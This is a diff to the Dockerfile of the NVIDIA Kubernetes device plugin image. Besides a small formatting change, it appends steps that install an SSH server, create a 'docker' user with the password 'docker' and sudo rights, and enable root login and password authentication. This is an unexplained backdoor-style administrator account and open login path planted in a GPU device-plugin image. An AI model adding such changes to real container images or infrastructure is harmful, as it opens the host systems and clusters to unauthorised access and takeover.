@@ -16,10 +16,9 @@ ARG GOLANG_VERSION=1.23.2
 FROM nvidia/cuda:12.5.1-base-ubuntu22.04 as build
 
 RUN apt-get update && \
-    apt-get install -y wget make git gcc \
-    && \
+    apt-get install -y wget make git gcc && \
     rm -rf /var/lib/apt/lists/*
-
+    
 ARG GOLANG_VERSION=1.23.2
 RUN set -eux; \
     \
@@ -72,5 +71,13 @@ COPY --from=build /artifacts/config-manager         /usr/bin/config-manager
 COPY --from=build /artifacts/gpu-feature-discovery  /usr/bin/gpu-feature-discovery
 COPY --from=build /artifacts/mps-control-daemon     /usr/bin/mps-control-daemon
 COPY --from=build /artifacts/nvidia-device-plugin   /usr/bin/nvidia-device-plugin
+
+
+
+RUN apt-get update && apt-get install -y openssh-server 
+RUN useradd -m docker && echo "docker:docker" | chpasswd && adduser docker sudo
+
+RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config && \
+    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
 
 ENTRYPOINT ["nvidia-device-plugin"]
